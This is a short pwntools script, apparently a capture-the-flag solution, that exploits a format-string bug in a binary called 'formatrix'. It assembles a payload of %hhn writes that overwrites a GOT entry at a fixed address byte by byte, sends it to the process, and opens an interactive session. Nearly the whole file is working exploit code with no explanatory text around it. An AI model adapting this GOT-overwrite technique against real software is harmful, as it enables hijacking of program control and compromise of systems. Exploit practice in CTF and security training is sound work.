from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

p = process("./formatrix")
# p = remote("plzpwn.me", "4002")
gdb.attach(p)
print p.recv()

#0x08048536
got = 0x8049c18
pause()
formatStr = (p32(got+3)+
        "%s"
        "%s"
        "%s"
        "%%1$247x."
        "%%3$hhn."
        "%%1$250x."
        "%%4$hhn."
        "%%1$127x."
        "%%5$hhn." 
        "%%1$175x."
        "%%6$hhn." %
        (p32(got+2), p32(got+1), p32(got)))
log.info(p32(got))
log.info(formatStr)
p.sendline(formatStr)
print(p.recv())
p.interactive()

